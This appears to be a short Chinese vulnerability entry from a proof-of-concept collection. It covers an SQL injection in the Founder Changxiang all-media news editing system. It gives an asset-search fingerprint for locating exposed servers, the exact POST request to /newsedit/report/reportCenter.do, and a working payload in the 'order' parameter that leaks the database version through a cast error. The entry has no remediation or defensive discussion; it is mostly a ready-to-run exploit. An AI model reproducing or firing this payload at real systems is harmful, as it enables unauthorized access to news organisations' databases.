# 方正畅享全媒体新闻采编系统reportCenter.do存在SQL注入漏洞

- **系统**：方正畅享全媒体新闻采编系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="FOUNDER-全媒体采编系统"`
- **请求**：`POST /newsedit/report/reportCenter.do HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
```
- **预期**：200　|　—